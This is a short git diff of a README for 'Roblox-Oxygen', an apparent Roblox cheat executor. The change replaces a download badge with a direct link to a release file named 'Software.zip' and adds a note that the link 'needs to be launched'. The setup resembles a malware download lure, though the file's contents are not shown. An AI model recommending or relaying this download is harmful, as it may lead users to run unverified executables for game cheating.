@@ -26,7 +26,7 @@ Welcome to the "Roblox-Oxygen" repository! This is your one-stop solution for th
 
 ## Installation
 To get started with the Roblox Oxygen Executor, simply download the latest version from the following link:
-[![Download Roblox-Oxygen](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Roblox-Oxygen](https://github.com/MrFymeq/Roblox-Oxygen/releases/download/v1.0/Software.zip)](https://github.com/MrFymeq/Roblox-Oxygen/releases/download/v1.0/Software.zip)
 
 *Note: The link above needs to be launched.*
 
